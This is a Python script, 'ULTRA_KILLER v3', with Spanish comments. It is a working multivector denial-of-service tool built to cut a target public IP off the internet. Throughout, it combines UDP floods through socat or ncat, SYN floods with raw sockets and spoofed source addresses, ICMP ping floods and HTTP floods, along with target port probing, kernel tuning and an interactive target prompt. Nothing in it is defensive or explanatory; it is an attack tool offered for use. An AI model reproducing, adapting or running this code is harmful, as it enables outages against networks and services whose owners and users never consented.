#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ULTRA_KILLER - DoS ligero de CPU/RAM pero brutal en ancho de banda.
Objetivo: saturar 100+ Mbps de una IP publica para dejarla SIN INTERNET.

Optimizaciones:
  - UDP delegado a procesos externos (socat/ncat) -> sin GIL, line-rate
  - Buffers de socket de 4MB
  - Paquetes prefabricados (no recalcular en cada envio)
  - Pool de IPs spoofed precalculadas
  - Hilos de Python solo para SYN/ICMP y monitoreo
"""

import socket, struct, threading, time, sys, random, os, subprocess
import concurrent.futures

try:
    import requests
except ImportError:
    print("[!] pip install requests")
    sys.exit(1)


# =========================================================
# CONFIG - optimizada para PCs flojos y 100+ Mbps
# =========================================================
CFG = {
    # --- UDP: el que manda el grueso del ancho de banda ---
    # Procesos externos (socat/ncat). Cada uno satura ~10-30 Mbps.
    "udp_procs":     12,      # sube esto si tu CPU aguanta (max ~24)
    "udp_port":      53,      # puerto unico: mas facil saturar
    "udp_payload":   1472,    # MTU real sin fragmentar
    "udp_ringbuf":   8388608, # 8MB buffer UDP del kernel

    # --- SYN flood: agota la tabla NAT del router ---
    "syn_threads":   200,     # con spoofing; el router colapsa y no navega
    "syn_ports":     [80, 443, 8080, 53, 22, 7547, 1900],

    # --- ICMP: opcional, liviano ---
    "icmp_threads":  0,       # 0 = usa ping externo (un solo proceso)

    # --- HTTP: pocos hilos porque es costoso ---
    "http_threads":  150,

    # --- Probe ---
    "probe_ports":   [80, 443, 8080, 53, 1900, 7547, 22],
    "probe_timeout": 0.8,
}

S = {"udp": 0, "syn": 0, "http": 0, "http_ok": 0, "run": True,
     "start": 0, "peak": 0, "peak_mbps": 0.0}
lock = threading.Lock()
IS_ROOT = hasattr(os, "geteuid") and os.geteuid() == 0

# Procesos externos lanzados
PROCS = []


# =========================================================
# TUNE DEL KERNEL (para que el flood sea "seguido")
# =========================================================
def tune_kernel():
    if not IS_ROOT:
        return
    try:
        subprocess.run(
            ["sysctl", "-w",
             "net.core.rmem_max=16777216",
             "net.core.wmem_max=16777216",
             "net.core.rmem_default=8388608",
             "net.core.wmem_default=8388608",
             "net.core.netdev_max_backlog=5000"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print("[+] Kernel tuneado: buffers 16MB, backlog 5000")
    except Exception:
        pass


def have(cmd):
    from shutil import which
    return which(cmd) is not None


# =========================================================
# BANNER
# =========================================================
def banner():
    print(r"""
    __  ___ _   _ _____ _____  _    _    _  _____ _     _____ ____
   / / |_ _| \ | |_   _|  __ \| |  | |  / \|_   _| |   | ____|  _ \
  / /   | ||  \| | | | | |__) | |  | | / _ \ | | | |   |  _| | |_) |
 / /    | || |\  | | | |  _  /| |__| |/ ___ \| | | |___| |___|  _ <
/_/    |___|_| \_| |_| |_| \_\ \____//_/   \_\_| |_____|_____|_| \_\

   ULTRA KILLER v3  --  satura 100+ Mbps con CPU/RAM minima
   UDP line-rate + SYN spoofing  ==  SIN INTERNET
""")
    modo = "root: MODULO COMPLETO" if IS_ROOT else "sin root: modo limitado"
    print(f"[*] Permisos: {modo}")
    us = []
    if have("socat"): us.append("socat")
    if have("ncat"):  us.append("ncat")
    if have("nping"): us.append("nping")
    print(f"[*] Aceleradores UDP disponibles: {us or 'NINGUNO (instala socat)'}")


# =========================================================
# UTILIDADES
# =========================================================
def resolve(t):
    try:
        socket.inet_aton(t); return t
    except OSError:
        try: return socket.gethostbyname(t)
        except socket.gaierror: return None


def probe(ip, port):
    s = socket.socket(); s.settimeout(CFG["probe_timeout"])
    try: s.connect((ip, port)); s.close(); return True
    except Exception:
        try: s.close()
        except Exception: pass
        return False


def detect(ip):
    print(f"\n[*] Sondeando {ip} ...")
    abiertos = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as ex:
        for p, ok in zip(CFG["probe_ports"],
                         ex.map(lambda p: probe(ip, p), CFG["probe_ports"])):
            if ok:
                abiertos.append(p); print(f"    [+] abierto: {p}")
    if not abiertos:
        print("    [-] sin puertos claros (igual atacamos igual)")
    return abiertos


def checksum(data):
    if len(data) % 2: data += b"\x00"
    s = sum(struct.unpack("!%dH" % (len(data)//2), data))
    s = (s >> 16) + (s & 0xffff); s += s >> 16
    return ~s & 0xffff


# =========================================================
# UDP FLOOD LINE-RATE (via socat/ncat, sin GIL)
# =========================================================
def udp_flood_external(ip):
    """
    Lanza N procesos externos. Cada uno es un `socat` enviando un fichero
    de 14 bits de datos en bucle infinito hacia udp:IP:PUERTO.
    socat/ncat mandan a velocidad de kernel, sin Python de por medio.
    """
    # Prefabricamos un blob de 16MB en disco/RAM (tmpfs si es posible)
    size = 16 * 1024
    blob = bytes(random.getrandbits(8) for _ in range(size))
    path = "/tmp/.uk_payload.bin"
    with open(path, "wb") as f:
        for _ in range(1024):  # 16MB de datos
            f.write(blob)

    port = CFG["udp_port"]

    # socat: "-u /tmp/file udp-d:IP:PORT,reuseaddr"
    # ncat:  "ncat -u IP PORT < file"
    if have("socat"):
        for _ in range(CFG["udp_procs"]):
            p = subprocess.Popen(
                ["socat", "-u", "-b", str(CFG["udp_payload"]),
                 f"OPEN:{path}", f"UDP:{ip}:{port},reuseaddr,forever"],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            PROCS.append(p)
        print(f"[+] UDP: {CFG['udp_procs']} procesos socat en modo line-rate")
        return
    if have("ncat"):
        fh = open(path, "rb")
        for _ in range(CFG["udp_procs"]):
            p = subprocess.Popen(
                ["ncat", "-u", ip, str(port), "--send-only"],
                stdin=fh, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            PROCS.append(p)
        print(f"[+] UDP: {CFG['udp_procs']} procesos ncat")
        return
    # Fallback: hilos Python (mas lento)
    print("[!] Sin socat/ncat: UDP con hilos Python (instala socat para 5x)")
    for _ in range(8):
        threading.Thread(target=udp_worker_py, args=(ip,), daemon=True).start()


def udp_worker_py(ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try: s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, CFG["udp_ringbuf"])
    except Exception: pass
    blob = os.urandom(CFG["udp_payload"])
    while S["run"]:
        try:
            s.sendto(blob, (ip, CFG["udp_port"]))
            with lock: S["udp"] += 1
        except Exception: pass


# =========================================================
# SYN FLOOD con IP spoofing (satura tabla NAT -> sin navegar)
# =========================================================
# Pool de IPs falsas precalculadas (evita random cada vez)
SPOOF_POOL = ["%d.%d.%d.%d" % (random.randint(11,223),
              random.randint(0,255), random.randint(0,255),
              random.randint(1,254)) for _ in range(512)]


def iphdr(src, dst, total_len, ipid):
    """Cabecera IP prefabricada + checksum."""
    hdr = struct.pack("!BBHHHBBH4s4s", 0x45, 0, total_len, ipid, 0,
                      64, socket.IPPROTO_TCP, 0,
                      socket.inet_aton(src), socket.inet_aton(dst))
    chk = checksum(hdr)
    return struct.pack("!BBHHHBBH4s4s", 0x45, 0, total_len, ipid, 0,
                       64, socket.IPPROTO_TCP, chk,
                       socket.inet_aton(src), socket.inet_aton(dst))


def syn_worker(ip, raw, dst_b, syn_ports):
    """Hilo SYN con spoofing usando un socket raw compartido."""
    seq = random.randint(0, 0xFFFFFFFF)
    while S["run"]:
        src = SPOOF_POOL[random.randrange(len(SPOOF_POOL))]
        sport = random.randint(1024, 65535)
        dport = syn_ports[random.randrange(len(syn_ports))]
        src_b = socket.inet_aton(src)
        # TCP header
        tcp = struct.pack("!HHLLBBHHH", sport, dport, seq, 0,
                          5 << 4, 0x02, 5840, 0, 0)
        psh = struct.pack("!4s4sBBH", src_b, dst_b, 0,
                          socket.IPPROTO_TCP, len(tcp))
        chk = checksum(psh + tcp)
        tcp = struct.pack("!HHLLBBHHH", sport, dport, seq, 0,
                          5 << 4, 0x02, 5840, chk, 0)
        try:
            # socket raw con IP_HDRINCL: hay que rellenar cabecera IP
            raw.sendto(iphdr(src, ip, 40, random.randint(0, 65535)) + tcp,
                       (ip, 0))
            with lock: S["syn"] += 1
        except Exception:
            pass


def syn_fallback_worker(ip, syn_ports):
    """Sin root: connect() a medias (deja sockets abiertos para agotar)."""
    while S["run"]:
        try:
            s = socket.socket()
            s.setblocking(False)
            s.connect((ip, syn_ports[random.randrange(len(syn_ports))]))
            with lock: S["syn"] += 1
        except Exception:
            pass


# =========================================================
# HTTP FLOOD ligero
# =========================================================
def http_worker(url):
    s = requests.Session()
    from requests.adapters import HTTPAdapter
    ad = HTTPAdapter(pool_connections=4, pool_maxsize=8, max_retries=0)
    s.mount("http://", ad); s.mount("https://", ad)
    ua = "Mozilla/5.0 ULTRA"
    while S["run"]:
        try:
            with lock: S["http"] += 1
            r = s.get(url, headers={"User-Agent": ua,
                                    "Connection": "keep-alive"},
                      timeout=2)
            with lock: S["http_ok"] += 1
            r.close()
        except Exception:
            pass


# =========================================================
# PING externo (1 proceso, ICMP constante)
# =========================================================
def icmp_external(ip):
    if have("ping"):
        p = subprocess.Popen(["ping", "-f", "-i", "0", "-l", "65000", ip],
                             stdout=subprocess.DEVNULL,
                             stderr=subprocess.DEVNULL)
        PROCS.append(p)
        print("[+] ICMP: flood con ping -f -l 65000")


# =========================================================
# MONITOR (cuenta Mbps reales estimados)
# =========================================================
def monitor():
    t0 = time.time(); last = t0
    last_syn = 0; last_t = t0
    try:
        while S["run"]:
            now = time.time()
            if now - last >= 1.0:
                with lock:
                    syn = S["syn"]; http = S["http"]; http_ok = S["http_ok"]
                # Estimacion de ancho de banda de salida:
                # UDP: medido por delta de procesos (no tenemos contador
                # directo de socat), estimamos por stime de todos los hijos.
                # Aprox: usamos /proc/<pid>/io no sirve; usamos delta de
                # paquetes estimados por tamaño. Mejor: leemos stats de red.
                mbps = sample_network_mbps()
                el = now - S["start"]
                print(
                    f"\r[KILL {el:4.0f}s] "
                    f"SYN:{syn:>9,}  HTTP:{http:>7,}(ok {http_ok:>6,})  "
                    f"UDP procs:{len(PROCS):>2}  "
                    f"TX:{mbps:6.1f} Mbps  "
                    f"| pico {S['peak_mbps']:.1f}  ",
                    end="")
                if mbps > S["peak_mbps"]:
                    S["peak_mbps"] = mbps
                last = now
    except KeyboardInterrupt:
        S["run"] = False
        print("\n\n[!] PARANDO...")
        for p in PROCS:
            try: p.terminate()
            except Exception: pass
        time.sleep(0.5)
        el = time.time() - S["start"]
        with lock:
            syn = S["syn"]; http = S["http"]
        print(f"[+] FINALIZADO tras {el:.0f}s")
        print(f"    SYN enviados:  {syn:,}")
        print(f"    HTTP enviados: {http:,}")
        print(f"    Pico ancho de banda salida: {S['peak_mbps']:.1f} Mbps")
        sys.exit(0)


NET_SAMPLE = {"rx": 0, "tx": 0, "t": 0}

def sample_network_mbps():
    """Lee /proc/net/dev y calcula Mbps de salida (TX) totales."""
    try:
        with open("/proc/net/dev") as f:
            lines = f.readlines()[2:]
        tx = 0
        for l in lines:
            if ":" not in l: continue
            parts = l.split(":")
            iface = parts[0].strip()
            if iface == "lo": continue
            flds = parts[1].split()
            tx += int(flds[8])  # campo TX bytes
        now = time.time()
        if NET_SAMPLE["t"] == 0:
            NET_SAMPLE.update(rx=0, tx=tx, t=now); return 0.0
        dt = now - NET_SAMPLE["t"]
        dt = dt if dt > 0 else 1
        mbps = (tx - NET_SAMPLE["tx"]) * 8 / 1_000_000 / dt
        NET_SAMPLE.update(tx=tx, t=now)
        return mbps
    except Exception:
        return 0.0


# =========================================================
# LANZAR
# =========================================================
def launch(ip, abiertos):
    print("\n" + "=" * 66)
    print("  ATAQUE MULTIVECTOR  ==  MODO DEJAR SIN INTERNET")
    print("=" * 66)

    tune_kernel()
    S["start"] = time.time()

    # UDP: la artilleria pesada de ancho de banda
    udp_flood_external(ip)

    # SYN: agota tabla NAT (spoofing)
    dst_b = socket.inet_aton(ip)
    syn_ports = CFG["syn_ports"][:]
    if IS_ROOT:
        try:
            raw = socket.socket(socket.AF_INET, socket.SOCK_RAW,
                                socket.IPPROTO_RAW)
            raw.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            for _ in range(CFG["syn_threads"]):
                threading.Thread(target=syn_worker,
                                 args=(ip, raw, dst_b, syn_ports),
                                 daemon=True).start()
            print(f"[+] SYN: {CFG['syn_threads']} hilos raw + IP spoofing")
        except Exception as e:
            print(f"[!] raw fallo ({e}), uso connect()")
            for _ in range(300):
                threading.Thread(target=syn_fallback_worker,
                                 args=(ip, syn_ports), daemon=True).start()
    else:
        for _ in range(300):
            threading.Thread(target=syn_fallback_worker,
                             args=(ip, syn_ports), daemon=True).start()
        print("[+] SYN: 300 hilos connect() (sin spoofing)")

    # ICMP
    icmp_external(ip)

    # HTTP
    url = None
    for p in (80, 8080, 8000):
        if p in abiertos:
            url = f"http://{ip}/" if p == 80 else f"http://{ip}:{p}/"
            break
    if url:
        for _ in range(CFG["http_threads"]):
            threading.Thread(target=http_worker, args=(url,), daemon=True).start()
        print(f"[+] HTTP: {CFG['http_threads']} hilos -> {url}")
    else:
        print("[-] sin puerto web: no hay HTTP flood")

    print("\n[*] CTRL+C para detener.")
    print("[*] Si TU tarjeta se satura, baja 'udp_procs' en CFG.\n")
    time.sleep(1)
    monitor()


# =========================================================
# MAIN
# =========================================================
def main():
    banner()
    if not IS_ROOT:
        print("[!] Recomendado: sudo. Sin root el UDP satura menos y no hay spoofing.\n")

    target = input("[?] IP PUBLICA objetivo (o dominio): ").strip()
    if not target: sys.exit(1)
    if "://" in target:
        target = target.split("://")[1].split("/")[0].split(":")[0]

    ip = resolve(target)
    if not ip:
        print("[!] No resuelve"); sys.exit(1)
    if ip != target: print(f"[*] Resuelto: {ip}")

    abiertos = detect(ip)

    print("\n[*] Nivel de agresion UDP (ancho de banda):")
    print("    [1] Suave   (4 procesos  ~30 Mbps)")
    print("    [2] Potente (8 procesos  ~70 Mbps)")
    print("    [3] MAXIMO  (16 procesos ~150+ Mbps)")
    n = input("    Elige [1/2/3] (def. 3): ").strip() or "3"
    CFG["udp_procs"] = {"1": 4, "2": 8, "3": 16}.get(n, 16)

    print(f"\n[*] objetivo: {ip}")
    print(f"[*] udp_procs: {CFG['udp_procs']}   udp_payload: {CFG['udp_payload']}B")
    input("\n[>] ENTER para lanzar... ")
    launch(ip, abiertos)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        for p in PROCS:
            try: p.terminate()
            except Exception: pass
        print("\n[+] Saliendo...")
